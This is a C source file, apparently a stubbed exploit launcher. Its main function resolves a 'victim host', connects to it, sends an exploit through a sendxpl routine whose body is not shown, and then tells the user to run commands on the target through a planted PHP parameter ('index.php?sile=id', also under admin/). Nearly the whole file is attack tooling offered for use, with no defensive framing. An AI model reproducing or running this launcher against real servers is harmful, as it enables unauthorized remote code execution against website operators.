
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_port; int sin_family; int sin_addr; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int addr ;
typedef int FILE ;


 int AF_INET ;
 int PORT ;
 int SOCK_STREAM ;
 int atoi (char*) ;
 int banner () ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int errconn (char**) ;
 int errgeth () ;
 int errsock () ;
 int * fdopen (int,char*) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int ) ;
 int info () ;
 int memcpy (char*,int ,int ) ;
 int memset (struct sockaddr_in*,int ,int) ;
 int printf (char*,...) ;
 int sendxpl (int *,char**,int) ;
 int setbuf (int *,int *) ;
 int shutdown (int,int) ;
 int socket (int ,int ,int ) ;

int main(int argc, char *argv[]){

FILE *out;
int sock, sockconn, type;
struct sockaddr_in addr;
struct hostent *hp;

if(argc!=4)
   info();

type = atoi(argv[3]);

if(type < 1 || type > 3)
   info();

banner();

if((sock = socket(AF_INET,SOCK_STREAM,0)) < 0)
   errsock();

   printf("[*] Creating socket		[OK]\n");

if((hp = gethostbyname(argv[1])) == ((void*)0))
   errgeth();

   printf("[*] Resolving victim host	[OK]\n");

memset(&addr,0,sizeof(addr));
memcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);
addr.sin_family = AF_INET;
addr.sin_port = htons(PORT);

sockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));
if(sockconn < 0)
   errconn(argv);

   printf("[*] Connecting at victim host   [OK]\n");

out = fdopen(sock,"a");
setbuf(out,((void*)0));

sendxpl(out,argv,type);

   printf("[*] Now test at execute code on\n\n"
          "[1] %s%sindex.php?sile=id\n"
          "[2] %s%sadmin/index.php?sile=id\n\n",argv[1],argv[2],argv[1],argv[2]);

shutdown(sock,2);
close(sock);

return 0;

}
